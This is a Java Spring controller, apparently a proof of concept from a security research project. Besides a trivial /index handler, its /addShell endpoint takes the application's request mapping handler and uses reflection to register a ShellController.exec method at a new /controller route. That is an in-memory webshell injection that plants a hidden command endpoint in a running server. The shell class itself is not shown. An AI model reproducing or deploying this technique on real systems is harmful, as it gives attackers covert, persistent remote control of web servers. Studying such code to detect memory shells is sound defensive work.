package cn.safe6.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import java.lang.reflect.Method;

@Controller
public class TestController {




    @RequestMapping("/index")
    public String test(){
        System.out.println(1);
        return "index";
    }

    @RequestMapping("/addShell")
    public String add() throws Exception {
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        //WebApplicationContext context1 = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping handlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        RequestMappingInfo requestMappingInfo = new RequestMappingInfo(new PatternsRequestCondition("/controller"),null,null,null,null,null,null);
        Class shell = Class.forName("cn.safe6.controller.ShellController");
        Method method = shell.getMethod("exec");

        handlerMapping.registerMapping(requestMappingInfo,shell.newInstance(),method);


        System.out.println(1);
        return "index";
    }
}
